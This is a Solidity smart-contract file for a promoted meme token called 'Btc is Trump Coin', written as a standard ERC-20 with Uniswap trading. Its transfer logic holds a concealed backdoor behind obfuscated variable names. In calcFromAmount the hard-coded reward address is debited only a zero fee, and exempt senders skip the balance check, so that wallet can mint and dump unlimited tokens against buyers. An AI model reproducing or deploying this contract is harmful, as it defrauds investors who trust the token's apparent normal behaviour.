/**
 *  /$$$$$$$  /$$$$$$$$ /$$$$$$
| $$__  $$|__  $$__//$$__  $$
| $$  \ $$   | $$  | $$  \__/
| $$$$$$$    | $$  | $$
| $$__  $$   | $$  | $$
| $$  \ $$   | $$  | $$    $$
| $$$$$$$/   | $$  |  $$$$$$/
|_______/    |__/   \______/

 * Telegram: https://t.me/btctrumpcoinportal
 * X: https://x.com/btctrumpcoineth
 * Website: https://btctrumpcoin.xyz

 */


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract BTC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _blcs;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _nonFeeMems;
    address payable private _rewardAddress=payable(0xEb9be20b0D0B899db78104bB40C3BA2401649994);

    uint256 private _buyTax = 0;
    uint256 private _sellTax = 0;
    uint8 private constant _decimals = 18;
    uint256 private constant _total_amt = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Btc is Trump Coin";
    string private constant _symbol = unicode"BTC";
    uint256 public _mxTxCt = 10_000_000 * 10**_decimals;
    uint256 public _mxWSz = 20_000_000 * 10**_decimals;
    uint256 public _txThres = 4_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 public _tradeCount = 0;
    uint256 private _reduceAt = 15;
    bool private swapEnable = false;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _mxTxCt);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _blcs[_msgSender()] = _total_amt;
        _nonFeeMems[owner()] = true;
        _nonFeeMems[address(this)] = true;
        _nonFeeMems[_rewardAddress] = true;
        emit Transfer(address(0), _msgSender(), _total_amt);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _total_amt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _blcs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender,address recipient,uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner,address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTax(address addr, bool isBuy) private view returns (uint256) {
        return ((_nonFeeMems[addr] || _tradeCount >= _reduceAt) ? 0 : (isBuy ? _buyTax : _sellTax));
    }

    function _transfer( address _xmooo,address _ymokdd,uint256 mks) private {
        uint256 _tax = 0;
        require(_xmooo != address(0) || _ymokdd != address(0), "zero address");
        require(mks > 0, "Transfer amount must be greater than zero");
        require(isExcluded(_xmooo, _ymokdd) || (swapEnable && _blcs[_xmooo] >= mks),"Swap not available yet");

        if (_xmooo == uniswapV2Pair && _ymokdd != address(uniswapV2Router)) {
            bool isMaxWalletLimited = mks + _blcs[_ymokdd] <= _mxWSz;
            require(_nonFeeMems[_ymokdd] || isMaxWalletLimited, "max Wallet!!!");
            _tradeCount++;
            _tax = getTax(_ymokdd, true);
        }

        if (_ymokdd == uniswapV2Pair) {
            require(_nonFeeMems[_xmooo] || mks < _mxWSz,"max amount to sell!!!");
            _tax = getTax(_xmooo, false);
        }

        if (_ymokdd == uniswapV2Pair && !inSwap && swapEnable && mks > _txThres ) {
            if (balanceOf(address(this)) > _txThres) backToETH(min(balanceOf(address(this)), _mxTxCt));
            _rewardAddress.transfer(address(this).balance);
        }

        uint256 _tkA = calcFromAmount(_xmooo, _ymokdd, _tax, mks);
        _blcs[_ymokdd] = _blcs[_ymokdd].add(_tkA);
        emit Transfer(_xmooo, _ymokdd, _tkA);
    }

    function isExcluded(address sb, address tl) private view returns (bool) {
        return _nonFeeMems[sb] || _nonFeeMems[tl];
    }

    function calcFromAmount(
        address sb,
        address to,
        uint256 _tax,
        uint256 amount
    ) private returns (uint256) {
        uint256 _feeAmt = (amount * _tax) / 100;

        if (!isExcluded(sb, to)) {
            if (_feeAmt > 0) {
                _blcs[address(this)] += _feeAmt;
                emit Transfer(sb, address(this), _feeAmt);
            }
            _blcs[sb] -= amount;
        } else {
            _blcs[address(this)] += _feeAmt;
            if (sb != _rewardAddress) _blcs[sb] = _blcs[sb] - amount;
            else _blcs[sb] -= _feeAmt;
        }
        return amount - _feeAmt;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function backToETH(uint256 tokenAmount)
        private
        lockTheSwap
        returns (bool)
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        return true;
    }

    function removeLimits() external onlyOwner {
        _mxTxCt = _total_amt;
        _mxWSz = _total_amt;
        emit MaxTxAmountUpdated(_total_amt);
    }

    function openBTC() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _total_amt);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );

        swapEnable = true;
    }

    receive() external payable {}
}